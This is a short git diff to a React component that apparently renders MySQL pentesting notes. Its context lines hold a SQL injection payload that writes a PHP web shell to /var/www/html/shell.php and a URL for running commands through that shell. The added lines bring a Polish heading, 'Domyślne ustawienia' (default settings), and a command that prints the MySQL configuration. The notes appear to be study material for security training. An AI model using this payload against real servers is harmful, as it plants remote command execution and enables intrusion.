@@ -155,6 +155,14 @@ const MySQL = () => {
             
             <p className='important'>cn' union select "",'{'<'}?php system($_REQUEST[0]); ?{'>'}', "", "" into outfile '/var/www/html/shell.php'-- -</p>
             <p>http://SERVER_IP:PORT/shell.php?0=id</p>
+
+
+            <hr />
+            <h2 className='waring'>Domyślne ustawienia</h2>
+
+            <div className='waring'>
+                <p>cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'</p>
+            </div>
         </section>
     )
 }
